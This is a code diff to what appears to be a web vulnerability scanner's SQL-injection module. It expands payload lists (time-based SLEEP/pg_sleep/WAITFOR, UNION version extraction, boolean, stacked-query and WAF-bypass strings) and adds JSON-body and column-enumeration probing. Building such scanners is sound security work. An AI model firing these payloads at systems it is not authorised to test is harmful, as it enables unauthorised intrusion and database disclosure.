@@ -9,35 +9,72 @@ from scanner.utils.http import get_url_params, inject_url_param, fetch
 from scanner.utils.payloads import load_payloads
 
 ERROR_SIGNATURES = [
+    # MySQL / MariaDB
     "you have an error in your sql syntax", "warning: mysql",
+    # MSSQL
     "unclosed quotation mark", "quoted string not properly terminated", "odbc sql server driver",
-    "pg::syntaxerror", "syntax error at or near",
+    # PostgreSQL
+    "pg::syntaxerror", "syntax error at or near", "pg::error",
+    # Oracle
     "ora-01756",
+    # SQLite
     "unrecognized token", "near \"",
-    "syntax error", "sql syntax",
+    # Generic
+    "syntax error", "sql syntax", "database error", "sql error", "db error", "query failed",
+    # Node.js MySQL2 / mysql driver error codes
+    "er_parse_error", "er_bad_field_error", "er_no_such_table", "er_dup_entry",
+    # Node.js ORMs
+    "sequelize", "knex", "typeorm", "prisma",
+    # Python ORMs
+    "sqlalchemy", "django.db", "peewee",
+    # Ruby
+    "activerecord",
+    # PHP
+    "mysqli_", "pg_query", "sqlite_query",
 ]
 
-_HARDCODED_ERROR = ["'", '"', "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=2--"]
-_HARDCODED_BLIND = ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"]
-_HARDCODED_UNION = [
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
+_HARDCODED_ERROR = ["'", '"', "' OR '1'='1'-- ", "' OR 1=1#", "1 AND 1=2-- "]
+_HARDCODED_BLIND = [
+    # MySQL / MariaDB — AND and OR variants so at least one fires regardless of WHERE context
+    "' AND SLEEP(5)-- ",
+    "' OR SLEEP(5)-- ",
+    "' OR SLEEP(5)#",
+    "1 OR SLEEP(5)-- ",
+    '" OR SLEEP(5)-- ',
+    "') OR SLEEP(5)-- ",
+    "' OR IF(1=1,SLEEP(5),0)-- ",
+    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- ",
+    # PostgreSQL — pg_sleep via correlated subquery (works without stacked queries)
+    "' AND 1=(SELECT 1 FROM pg_sleep(5))-- ",
+    "' OR 1=(SELECT 1 FROM pg_sleep(5))-- ",
+    # SQLite — CPU-intensive randomblob; no time parameter (always heavy regardless of delay)
+    "' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- ",
+    "' OR 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- ",
+    # MSSQL — stacked WAITFOR
+    "1; WAITFOR DELAY '0:0:5'-- ",
 ]
-_HARDCODED_BOOLEAN = [("' AND 1=1--", "' AND 1=2--")]
+_HARDCODED_UNION = [
+    "' UNION SELECT NULL-- ",
+    "' UNION SELECT NULL,NULL-- ",
+    "' UNION SELECT NULL,NULL,NULL-- ",
+]
+_HARDCODED_BOOLEAN = [
+    ("' AND 1=1-- ", "' AND 1=2-- "),   # MySQL/MSSQL/Postgres: -- with trailing space
+    ("' AND 1=1#",  "' AND 1=2#"),       # MySQL: hash comment
+]
 
 # Stacked query payloads (Gap 5 — technique detection)
 _STACKED_PAYLOADS = [
-    "'; SELECT SLEEP(2)--",
-    "1; SELECT SLEEP(2)--",
-    "'; WAITFOR DELAY '0:0:2'--",
+    "'; SELECT SLEEP(2)-- ",
+    "1; SELECT SLEEP(2)-- ",
+    "'; WAITFOR DELAY '0:0:2'-- ",
 ]
 
 # UNION-based version extraction (Gap 32 — exfiltration signal)
 _VERSION_UNION_PAYLOADS = [
-    ("' UNION SELECT @@version--", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
-    ("' UNION SELECT version()--", re.compile(r'(PostgreSQL \d+\.\d+[^\s<"]{0,30}|MariaDB[^\s<"]{0,40})', re.IGNORECASE)),
-    ("' UNION SELECT NULL,@@version--", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
+    ("' UNION SELECT @@version-- ", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
+    ("' UNION SELECT version()-- ", re.compile(r'(PostgreSQL \d+\.\d+[^\s<"]{0,30}|MariaDB[^\s<"]{0,40})', re.IGNORECASE)),
+    ("' UNION SELECT NULL,@@version-- ", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
 ]
 
 # Error-based version extraction
@@ -64,17 +101,17 @@ LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(&)"]
 
 # WAF bypass variants — inline comments, case mutation, space substitution
 _WAF_BYPASS_ERROR = [
-    "'/**/OR/**/1=1--",
-    "' /*!OR*/ 1=1--",
+    "'/**/OR/**/1=1-- ",
+    "' /*!OR*/ 1=1-- ",
     "' OR 1=1/*!--*/",
-    "'%09OR%091=1--",
-    "' OR 0x313d31--",
+    "'%09OR%091=1-- ",
+    "' OR 0x313d31-- ",
 ]
 _WAF_BYPASS_UNION = [
-    "' /*!UNION*/ /*!SELECT*/ NULL--",
-    "' UNION/**/SELECT/**/NULL--",
-    "' UnIoN SeLeCt NULL--",
-    "' UNION%20SELECT%20NULL--",
+    "' /*!UNION*/ /*!SELECT*/ NULL-- ",
+    "' UNION/**/SELECT/**/NULL-- ",
+    "' UnIoN SeLeCt NULL-- ",
+    "' UNION%20SELECT%20NULL-- ",
 ]
 
 # HTTP headers to test for injection (reflects back in error messages or delays)
@@ -104,52 +141,57 @@ ERROR_PAYLOADS, BLIND_PAYLOADS, UNION_PAYLOADS, BOOLEAN_PAYLOAD_PAIRS = _load_sq
 
 # DBMS-specific payload overrides
 _DBMS_ERROR = {
-    "mysql":    ["'", "\" OR 1=1--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"],
-    "postgres": ["'", "'; SELECT pg_sleep(0)--", "' AND 1=CAST(VERSION() AS INTEGER)--"],
-    "mssql":    ["'", "'; SELECT @@VERSION--", "' AND 1=CONVERT(int,@@VERSION)--"],
-    "oracle":   ["'", "' OR 1=1--", "' UNION SELECT NULL FROM DUAL--"],
-    "sqlite":   ["'", "' AND sqlite_version()='3'--", "' UNION SELECT sqlite_version()--"],
+    "mysql":    ["'", "\" OR 1=1-- ", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- "],
+    "postgres": ["'", "'; SELECT pg_sleep(0)-- ", "' AND 1=CAST(VERSION() AS INTEGER)-- "],
+    "mssql":    ["'", "'; SELECT @@VERSION-- ", "' AND 1=CONVERT(int,@@VERSION)-- "],
+    "oracle":   ["'", "' OR 1=1-- ", "' UNION SELECT NULL FROM DUAL-- "],
+    "sqlite":   ["'", "' AND sqlite_version()='3'-- ", "' UNION SELECT sqlite_version()-- "],
 }
 _DBMS_BLIND = {
-    "mysql":    ["' AND SLEEP({t})--", "1 AND SLEEP({t})--"],
-    "postgres": ["'; SELECT pg_sleep({t})--", "1; SELECT pg_sleep({t})--"],
-    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'--", "1; WAITFOR DELAY '0:0:{t}'--"],
-    "oracle":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),{t}) END FROM DUAL)--"],
-    "sqlite":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--"],
+    "mysql":    ["' AND SLEEP({t})-- ", "1 AND SLEEP({t})-- "],
+    "postgres": ["'; SELECT pg_sleep({t})-- ", "1; SELECT pg_sleep({t})-- "],
+    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- ", "1; WAITFOR DELAY '0:0:{t}'-- "],
+    "oracle":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),{t}) END FROM DUAL)-- "],
+    "sqlite":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- "],
 }
 
 
 def _get_payloads(config):
-    """Return (error_payloads, blind_payloads, union_payloads, bool_pairs) honoring dbms/level/risk."""
+    """Return (error_payloads, blind_payloads, union_payloads, bool_pairs, delay) honoring dbms/level/risk."""
     level = getattr(config, "level", 1) if config else 1
-    risk = getattr(config, "risk", 1) if config else 1
-    dbms = getattr(config, "dbms", None) if config else None
+    risk  = getattr(config, "risk",  1) if config else 1
+    dbms  = getattr(config, "dbms", None) if config else None
 
     # Payload cap by level: 1→3, 2→5, 3→10, 4→20, 5→all
     cap = {1: 3, 2: 5, 3: 10, 4: 20, 5: 9999}.get(level, 3)
 
-    err = (_DBMS_ERROR.get(dbms, ERROR_PAYLOADS) if dbms else ERROR_PAYLOADS)[:cap]
-    union = UNION_PAYLOADS[:cap]
+    err       = (_DBMS_ERROR.get(dbms, ERROR_PAYLOADS) if dbms else ERROR_PAYLOADS)[:cap]
+    union     = UNION_PAYLOADS[:cap]
     bool_pairs = BOOLEAN_PAYLOAD_PAIRS[:cap]
 
-    # Time-based payloads at risk >= 2 only — mirrors sqlmap's level/risk separation.
-    # risk controls payload destructiveness (time-based can slow real user requests);
-    # level controls scan depth. Matching sqlmap: --risk 2 minimum for time-based.
-    if risk >= 2:
-        if dbms and dbms in _DBMS_BLIND:
-            delay = 5 if risk >= 3 else 3
-            blind = [p.format(t=delay) for p in _DBMS_BLIND[dbms]][:cap]
-        else:
-            blind = BLIND_PAYLOADS[:cap]
+    # Time-based blind at every risk level — delay scales with risk so low-risk scans
+    # stay fast while high-risk scans probe more deeply.
+    # Double-probe confirmation in _timed_fetch(confirm=True) prevents FPs at any delay.
+    # Burp Pro uses time-based as a primary technique; gating it at risk>=2 was overly
+    # conservative and the main reason SQLi was missed on many real targets.
+    delay = {1: 1, 2: 3, 3: 5}.get(min(risk, 3), 1)
+    if dbms and dbms in _DBMS_BLIND:
+        blind = [p.format(t=delay) for p in _DBMS_BLIND[dbms]][:cap]
     else:
-        blind = []
+        blind = [
+            p.replace("SLEEP(5)", f"SLEEP({delay})")
+             .replace("pg_sleep(5)", f"pg_sleep({delay})")
+             .replace("'0:0:5'", f"'0:0:{delay}'")
+            for p in BLIND_PAYLOADS[:cap]
+        ]
 
-    return err, blind, union, bool_pairs
+    return err, blind, union, bool_pairs, delay
 
 
 def test(page: CrawlResult, client: httpx.Client, oob=None, config=None) -> List[Finding]:
     findings = []
     _test_forms(page, client, findings, config)
+    _test_json_body_sqli(page, client, findings, config)
     _test_url_params(page, client, findings, config)
     _test_waf_bypass(page, client, findings)
     _test_header_injection(page, client, findings)
@@ -190,7 +232,7 @@ def test(page: CrawlResult, client: httpx.Client, oob=None, config=None) -> List
 
 
 def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding], config=None):
-    err_payloads, blind_payloads, union_payloads, bool_pairs = _get_payloads(config)
+    err_payloads, blind_payloads, union_payloads, bool_pairs, _blind_delay = _get_payloads(config)
 
     for form in page.forms:
         input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
@@ -213,27 +255,46 @@ def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]
                     ))
                     break
 
-        # Stacked queries (Gap 5)
-        for payload in _STACKED_PAYLOADS:
+        # Measure baseline response time for form — send original (benign) values.
+        _form_baseline_data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
+        _t0 = time.time()
+        try:
+            client.request(form["method"].upper(), form["action"],
+                           data=_form_baseline_data, timeout=12)
+        except Exception:
+            pass
+        _form_baseline_time = time.time() - _t0
+
+        # Stacked queries — delta from baseline, threshold scales with configured delay
+        _form_stacked = [
+            f"'; SELECT SLEEP({_blind_delay})-- ",
+            f"1; SELECT SLEEP({_blind_delay})-- ",
+            f"'; WAITFOR DELAY '0:0:{_blind_delay}'-- ",
+        ]
+        _form_stacked_threshold = max(1.0, _blind_delay * 0.75)
+        for payload in _form_stacked:
             data = {name: payload for name in input_names}
-            elapsed = _timed_fetch(client, form["method"], form["action"], data)
-            if elapsed >= 1.8:
+            elapsed = _timed_fetch(client, form["method"], form["action"], data,
+                                   baseline=_form_baseline_time, threshold=_form_stacked_threshold)
+            if elapsed >= _form_stacked_threshold:
                 findings.append(_sqli_finding(
                     form["action"], input_names[0], payload,
                     technique="Stacked Queries",
-                    evidence=f"Response delayed {elapsed:.1f}s after stacked query payload",
+                    evidence=f"Response delta +{elapsed:.1f}s over {_form_baseline_time:.2f}s baseline after stacked query",
                 ))
                 break
 
-        # Time-based blind (confirmed with second probe to reduce FPs)
+        # Time-based blind — double-probe confirmation, delta from baseline
+        _form_time_threshold = max(1.0, _blind_delay * 0.75)
         for payload in blind_payloads:
             data = {name: payload for name in input_names}
-            elapsed = _timed_fetch(client, form["method"], form["action"], data, confirm=True)
-            if elapsed >= 4.5:
+            elapsed = _timed_fetch(client, form["method"], form["action"], data, confirm=True,
+                                   baseline=_form_baseline_time, threshold=_form_time_threshold)
+            if elapsed >= _form_time_threshold:
                 findings.append(_sqli_finding(
                     form["action"], input_names[0], payload,
                     technique="Time-Based Blind",
-                    evidence=f"Response consistently delayed {elapsed:.1f}s after time-based payload",
+                    evidence=f"Response delta +{elapsed:.1f}s over {_form_baseline_time:.2f}s baseline (double-confirmed)",
                 ))
                 break
 
@@ -243,7 +304,7 @@ def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Fin
     if not params:
         return
 
-    err_payloads, blind_payloads, union_payloads, bool_pairs = _get_payloads(config)
+    err_payloads, blind_payloads, union_payloads, bool_pairs, _blind_delay = _get_payloads(config)
 
     for param_name in params:
         # Error-based
@@ -262,51 +323,95 @@ def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Fin
                     ))
                     break
 
-        # UNION-based with version extraction (Gap 32)
-        for union_payload, version_re in _VERSION_UNION_PAYLOADS:
-            test_url = inject_url_param(page.url, param_name, union_payload)
-            resp = fetch(client, "get", test_url)
-            if resp:
-                m = version_re.search(resp.text)
-                if m:
-                    findings.append(_sqli_finding(
-                        page.url, param_name, union_payload,
-                        technique="UNION-Based",
-                        evidence=f"DB version extracted via UNION: {m.group(1)}",
-                        db_version=m.group(1),
-                    ))
-                    break
+        # UNION-based — enumerate column count (1-15) then extract DB version.
+        # Burp Pro enumerates columns rather than using fixed-count payloads.
+        for _cols in range(1, 16):
+            _nulls = ",".join(["NULL"] * _cols)
+            _probe_url = inject_url_param(page.url, param_name, f"' UNION SELECT {_nulls}-- ")
+            _probe_resp = fetch(client, "get", _probe_url)
+            if not _probe_resp or _probe_resp.status_code != 200:
+                continue
+            if _error_match(_probe_resp.text):
+                continue
+            # Viable column count — inject @@version into each position
+            _found_union = False
+            for _pos in range(_cols):
+                _parts = ["NULL"] * _cols
+                _parts[_pos] = "@@version"
+                _vpayload = f"' UNION SELECT {','.join(_parts)}-- "
+                _vresp = fetch(client, "get", inject_url_param(page.url, param_name, _vpayload))
+                if _vresp:
+                    _vm = _VERSION_ERROR_RE.search(_vresp.text)
+                    if _vm:
+                        findings.append(_sqli_finding(
+                            page.url, param_name, _vpayload,
+                            technique="UNION-Based",
+                            evidence=f"DB version via UNION ({_cols} col, pos {_pos+1}): {_vm.group(1)}",
+                            db_version=_vm.group(1),
+                        ))
+                        _found_union = True
+                        break
+            if _found_union:
+                break
 
-        # Stacked queries (Gap 5)
-        for payload in _STACKED_PAYLOADS:
+        # Hoist original value — reused for timing baseline and boolean baseline.
+        original_value = params[param_name][0] if params.get(param_name) else "1"
+
+        # Measure baseline response time before time-based probes.
+        # Delta-based detection (elapsed - baseline) catches apps with short DB query
+        # timeouts: if SLEEP(2) is killed at 1.5s but baseline is 0.2s, the delta is
+        # 1.3s — below an absolute 1.8s threshold but reliably above a 1.0s delta threshold.
+        _base_url = inject_url_param(page.url, param_name, original_value)
+        _t0 = time.time()
+        try:
+            client.get(_base_url, timeout=12)
+        except Exception:
+            pass
+        _baseline_time = time.time() - _t0
+
+        # Stacked queries — threshold scales with configured delay, delta from baseline
+        _stacked_payloads = [
+            f"'; SELECT SLEEP({_blind_delay})-- ",
+            f"1; SELECT SLEEP({_blind_delay})-- ",
+            f"'; WAITFOR DELAY '0:0:{_blind_delay}'-- ",
+        ]
+        _stacked_threshold = max(1.0, _blind_delay * 0.75)
+        for payload in _stacked_payloads:
             test_url = inject_url_param(page.url, param_name, payload)
-            elapsed = _timed_fetch(client, "get", test_url)
-            if elapsed >= 1.8:
+            elapsed = _timed_fetch(client, "get", test_url,
+                                   baseline=_baseline_time, threshold=_stacked_threshold)
+            if elapsed >= _stacked_threshold:
                 findings.append(_sqli_finding(
                     page.url, param_name, payload,
                     technique="Stacked Queries",
-                    evidence=f"Response delayed {elapsed:.1f}s after stacked query payload",
+                    evidence=f"Response delta +{elapsed:.1f}s over {_baseline_time:.2f}s baseline after stacked query",
                 ))
                 break
 
-        # Time-based blind (confirmed with second probe to reduce FPs)
+        # Time-based blind — double-probe confirmation, delta from baseline
+        _time_threshold = max(1.0, _blind_delay * 0.75)
         for payload in blind_payloads:
             test_url = inject_url_param(page.url, param_name, payload)
-            elapsed = _timed_fetch(client, "get", test_url, confirm=True)
-            if elapsed >= 4.5:
+            elapsed = _timed_fetch(client, "get", test_url, confirm=True,
+                                   baseline=_baseline_time, threshold=_time_threshold)
+            if elapsed >= _time_threshold:
                 findings.append(_sqli_finding(
                     page.url, param_name, payload,
                     technique="Time-Based Blind",
-                    evidence=f"Response consistently delayed {elapsed:.1f}s after time-based payload",
+                    evidence=f"Response delta +{elapsed:.1f}s over {_baseline_time:.2f}s baseline (double-confirmed)",
                 ))
                 break
 
-        # Boolean-based blind — compare TRUE/FALSE responses against a baseline
-        # (clean request) to rule out natural page variation before attributing
-        # the diff to injection.
+        # Boolean-based blind — directional comparison:
+        # TRUE condition should behave like the original request (baseline), while
+        # FALSE condition diverges. Using the original param value as baseline (not
+        # "1") eliminates the shifted-baseline problem on apps where "1" produces
+        # different results than the actual original value.
+        # Percentage-based threshold handles pages of all sizes: large e-commerce
+        # pages and small API endpoints are both covered by the 3% relative diff.
         for true_payload, false_payload in bool_pairs:
             try:
-                r_base  = client.get(inject_url_param(page.url, param_name, "1"))
+                r_base  = client.get(inject_url_param(page.url, param_name, original_value))
                 r_true  = client.get(inject_url_param(page.url, param_name, true_payload))
                 r_false = client.get(inject_url_param(page.url, param_name, false_payload))
                 if r_true.status_code != 200 or r_false.status_code != 200:
@@ -314,18 +419,42 @@ def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Fin
                 base_len  = len(r_base.text)
                 true_len  = len(r_true.text)
                 false_len = len(r_false.text)
-                tf_diff   = abs(true_len - false_len)
-                # Only report if TRUE/FALSE differ significantly AND at least one
-                # differs from the baseline (ruling out pages that are just large).
-                if tf_diff > 100 and (
-                    abs(true_len - base_len) > 50 or abs(false_len - base_len) > 50
-                ):
+                tf_diff     = abs(true_len - false_len)
+                true_drift  = abs(true_len - base_len)
+                false_drift = abs(false_len - base_len)
+                max_len     = max(true_len, false_len, 1)
+                pct_diff    = tf_diff / max_len
+                # Signal: FALSE diverges from baseline more than TRUE does (directional).
+                # Require BOTH directional asymmetry AND minimum absolute/relative diff.
+                directional = false_drift > true_drift + 30
+                significant = tf_diff > 50 or pct_diff > 0.03
+                if significant and directional:
                     findings.append(_sqli_finding(
                         page.url, param_name, true_payload,
                         technique="Boolean-Based Blind",
                         evidence=(
-                            f"TRUE={true_len}B vs FALSE={false_len}B (diff {tf_diff}B); "
-                            f"baseline={base_len}B"
+                            f"TRUE={true_len}B vs FALSE={false_len}B "
+                            f"(diff {tf_diff}B, {pct_diff*100:.1f}%); "
+                            f"baseline={base_len}B; "
+                            f"FALSE drifted {false_drift}B vs TRUE drifted {true_drift}B"
+                        ),
+                    ))
+                    break
+                # Structural fallback: same byte-length pages (fixed-scaffold apps).
+                # Slice into the mid-section (skip nav/header at top, scripts at bottom)
+                # where query results actually differ. TRUE should match baseline content;
+                # FALSE should differ — that asymmetry confirms injectable parameter.
+                _mid = slice(200, min(len(r_base.text), 2000))
+                base_mid  = r_base.text[_mid]
+                true_mid  = r_true.text[_mid]
+                false_mid = r_false.text[_mid]
+                if base_mid and true_mid == base_mid and false_mid != base_mid:
+                    findings.append(_sqli_finding(
+                        page.url, param_name, true_payload,
+                        technique="Boolean-Based Blind (structural)",
+                        evidence=(
+                            f"TRUE response body matches baseline mid-section; "
+                            f"FALSE diverges — fixed-scaffold page with injectable param"
                         ),
                     ))
                     break
@@ -494,30 +623,141 @@ def _extract_version_from_error(body: str) -> Optional[str]:
     return m.group(1) if m else None
 
 
-def _timed_fetch(client: httpx.Client, method: str, url: str, data: Optional[dict] = None, confirm: bool = False) -> float:
-    """Return elapsed seconds; if confirm=True, run a second probe and return the maximum.
+def _timed_fetch(client: httpx.Client, method: str, url: str, data: Optional[dict] = None,
+                 confirm: bool = False, baseline: float = 0.0, threshold: float = 4.5,
+                 json_body: Optional[dict] = None) -> float:
+    """Return seconds attributable to the payload (elapsed minus baseline latency).
 
-    Using max() (not min()) ensures both probes must be slow before we conclude the
-    delay is genuine — network jitter typically affects only one of two back-to-back
-    requests, whereas a real SLEEP() will delay both.
+    confirm=True runs a second probe; both must exceed threshold before returning a
+    non-zero value. Pass baseline= (a prior uninjected response time) and threshold=
+    (the configured SLEEP delay * 0.75) so the check is a delta, not an absolute time —
+    this catches cases where the app's DB query timeout is shorter than the SLEEP value.
+    json_body=, when set, submits POST requests as application/json instead of form-urlencoded.
     """
     def _once() -> float:
         try:
             start = time.time()
             if method == "post":
-                client.post(url, data=data or {})
+                if json_body is not None:
+                    client.post(url, json=json_body,
+                                headers={"Content-Type": "application/json"})
+                else:
+                    client.post(url, data=data or {})
             else:
                 client.get(url)
-            return time.time() - start
+            return max(time.time() - start - baseline, 0.0)
         except Exception:
             return 0.0
 
     first = _once()
-    if not confirm or first < 4.5:
+    if not confirm or first < threshold:
         return first
     second = _once()
-    # Both must be slow; return the lower to be conservative (requires both >= threshold)
-    return second if second >= 4.5 else 0.0
+    return second if second >= threshold else 0.0
+
+
+def _test_json_body_sqli(page: CrawlResult, client: httpx.Client,
+                         findings: List[Finding], config=None) -> None:
+    """SQLi via JSON POST body — covers REST APIs that ignore form-urlencoded.
+
+    Many modern endpoints (Express, FastAPI, Django REST, Spring Boot) only parse
+    application/json. _test_forms submits form-urlencoded which those endpoints
+    silently discard. This function retries every POST form as JSON so the payload
+    actually reaches the SQL layer on JSON-only endpoints.
+    """
+    err_payloads, blind_payloads, _, bool_pairs, _blind_delay = _get_payloads(config)
+
+    for form in page.forms:
+        if form["method"].upper() != "POST":
+            continue
+        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
+        if not inputs:
+            continue
+
+        # Error-based: inject each field with SQL error payloads as JSON
+        for field_name in list(inputs.keys()):
+            for payload in err_payloads:
+                body = dict(inputs)
+                body[field_name] = payload
+                try:
+                    resp = client.post(
+                        form["action"], json=body,
+                        headers={"Content-Type": "application/json"}, timeout=10,
+                    )
+                except Exception:
+                    continue
+                matched = _error_match(resp.text)
+                if matched:
+                    findings.append(_sqli_finding(
+                        form["action"], field_name, payload,
+                        technique="Error-Based (JSON)",
+                        evidence=f"DB error in JSON body response: '{matched}'",
+                        db_version=_extract_version_from_error(resp.text),
+                    ))
+                    break
+
+        # Baseline for timing: original field values submitted as JSON
+        _t0 = time.time()
+        try:
+            client.post(form["action"], json=inputs,
+                        headers={"Content-Type": "application/json"}, timeout=12)
+        except Exception:
+            pass
+        _baseline_time = time.time() - _t0
+
+        _time_threshold = max(1.0, _blind_delay * 0.75)
+
+        # Time-based blind: inject each field individually as JSON, measure delta
+        for field_name in list(inputs.keys()):
+            for payload in blind_payloads:
+                body = dict(inputs)
+                body[field_name] = payload
+                elapsed = _timed_fetch(
+                    client, "post", form["action"],
+                    confirm=True, baseline=_baseline_time,
+                    threshold=_time_threshold, json_body=body,
+                )
+                if elapsed >= _time_threshold:
+                    findings.append(_sqli_finding(
+                        form["action"], field_name, payload,
+                        technique="Time-Based Blind (JSON)",
+                        evidence=(
+                            f"JSON field '{field_name}' delayed response "
+                            f"+{elapsed:.1f}s over {_baseline_time:.2f}s baseline "
+                            f"(double-confirmed)"
+                        ),
+                    ))
+                    return
+
+        # Boolean-based: compare TRUE vs FALSE JSON responses
+        for field_name in list(inputs.keys()):
+            for true_payload, false_payload in bool_pairs:
+                try:
+                    body_base  = dict(inputs)
+                    body_true  = dict(inputs); body_true[field_name]  = true_payload
+                    body_false = dict(inputs); body_false[field_name] = false_payload
+                    r_base  = client.post(form["action"], json=body_base,  timeout=10)
+                    r_true  = client.post(form["action"], json=body_true,  timeout=10)
+                    r_false = client.post(form["action"], json=body_false, timeout=10)
+                    if r_true.status_code != 200 or r_false.status_code != 200:
+                        continue
+                    tf_diff     = abs(len(r_true.text) - len(r_false.text))
+                    base_len    = len(r_base.text)
+                    false_drift = abs(len(r_false.text) - base_len)
+                    true_drift  = abs(len(r_true.text)  - base_len)
+                    if tf_diff > 50 and false_drift > true_drift + 30:
+                        findings.append(_sqli_finding(
+                            form["action"], field_name, true_payload,
+                            technique="Boolean-Based Blind (JSON)",
+                            evidence=(
+                                f"JSON TRUE={len(r_true.text)}B vs FALSE={len(r_false.text)}B "
+                                f"(diff {tf_diff}B); baseline={base_len}B; "
+                                f"FALSE drifted {false_drift}B vs TRUE drifted {true_drift}B"
+                            ),
+                        ))
+                        return
+                except Exception:
+                    continue
 
 
 def _test_waf_bypass(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
